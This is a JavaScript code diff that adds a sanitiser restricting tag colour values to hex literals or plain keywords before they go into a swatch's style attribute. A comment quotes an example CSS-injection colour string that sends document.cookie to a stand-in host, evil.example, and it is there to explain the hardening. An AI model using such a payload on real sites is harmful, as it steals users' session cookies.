@@ -19,6 +19,25 @@
         return Array.prototype.slice.call(root.querySelectorAll(sel));
     }
 
+    // Tag.colour comes from the DB (settable by anyone with tag-edit
+    // permission). Restrict to hex literals + a small set of named
+    // colour keywords so a hostile colour like
+    //   "red; background-image:url(http://evil.example/exfil?c="+document.cookie+")"
+    // can't smuggle declarations into the swatch's style attribute.
+    // Anything that doesn't match falls back to the neutral default.
+    function safeColour(input) {
+        var fallback = '#777';
+        if (typeof input !== 'string') { return fallback; }
+        var s = input.trim();
+        if (/^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/.test(s)) {
+            return s;
+        }
+        if (/^[a-zA-Z]{3,32}$/.test(s)) {
+            return s;
+        }
+        return fallback;
+    }
+
     // -----------------------------------------------------------------
     // Repeatable fields — add / remove entry rows.
     // -----------------------------------------------------------------
@@ -760,7 +779,7 @@
             if (preSet[t.name]) { $cb.checked = true; }
             var $swatch = document.createElement('span');
             $swatch.className = 'et-tag-swatch';
-            $swatch.style.background = t.colour;
+            $swatch.style.background = safeColour(t.colour);
             var $name = document.createElement('span');
             $name.textContent = t.name;
             $label.appendChild($cb);
